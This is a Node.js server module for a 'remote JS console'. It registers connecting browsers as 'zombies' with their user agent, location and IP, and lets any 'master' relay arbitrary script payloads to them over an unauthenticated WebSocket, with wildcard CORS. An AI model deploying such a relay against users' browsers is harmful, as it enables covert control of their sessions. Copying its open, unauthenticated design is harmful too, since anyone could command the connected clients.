
/*
 * Remote console
 */
module.exports = (function(){

    var LOG_TAG = "REMOTE-JS-CONSOLE";
    var WebSocketServer = null;
    var wsserver =  null;
    var zombies = [];
    var zombie_name_counter = 0;
    var URL = null;

    /*
     *  Initialize everything
     *  Called at the beginning of the program by server.js
     */
    function init(context, config)
    {
        URL = context.require("url");
        WebSocketServer = context.require("websocket").server;
        wsserver = new WebSocketServer({
            httpServer : context.server,
            autoAcceptConnections : true,
        });
        wsserver.on("connect", onConnect);
    }

    function onRequest(request, response)
    {
         var req_url = URL.parse(request.url);
         if(req_url.pathname == "/remote-js-console/GetZombies")
         {
             getZombies(request, response);
             return true;
         }
         return false;
    }

    function getZombies(request, response)
    {
        var array = [];
        var i, l= zombies.length;
        for(i = 0; i < l; i++)
        {
            array.push({
                useragent : zombies[i].useragent,
                location : zombies[i].location,
                ip: zombies[i].ip
            });
        }
        setHeaders(response);
        response.end(JSON.stringify(array));
    }

    function onConnect(websocket)
    {
        websocket.on("message", function(message)
        {
            var data = message.utf8Data.split("\r\n");
            if(data[0].indexOf("zombieHere") == 0)
            {
                var zombie = {
                    useragent : data[1],
                    location : data[2],
                    ip : websocket.remoteAddress,
                    websocket : websocket,
                };
                addZombie(zombie);
            }
            else if(data[0].indexOf("masterHere") == 0)
            {
                var dest = data[1];
                var payload = data[2];
                zombies[parseInt(dest)].websocket.sendUTF(payload);
            }
        });
    }

    function setHeaders(response)
    {
        var headers = {
          "Content-Type" : "application/json; charset=utf-8",
          "Access-Control-Allow-Origin" : "*"
        };
        response.writeHead(200, headers);
    }

    /*
     * Each module must use a tag in its logs
     * Use this function instead of console.log(...)
     */
    function LOG(msg)
    {
        var i;
        var lines = msg.split("\r\n");
        var len = lines.length;
        for(i = 0; i < len; i++)
        {
            console.log(LOG_TAG + " - " + lines[i]);
        }
    }

    function addZombie(zombie)
    {
        zombie.zombieName = zombie_name_counter++;
        zombies.push(zombie);
        return zombie.zombieName;
    }

    function removeZombie(name)
    {

    }

    /*
     *  It returns the public interface
     *  for this module
     */
    return { init      : init,
             onRequest : onRequest };
})();
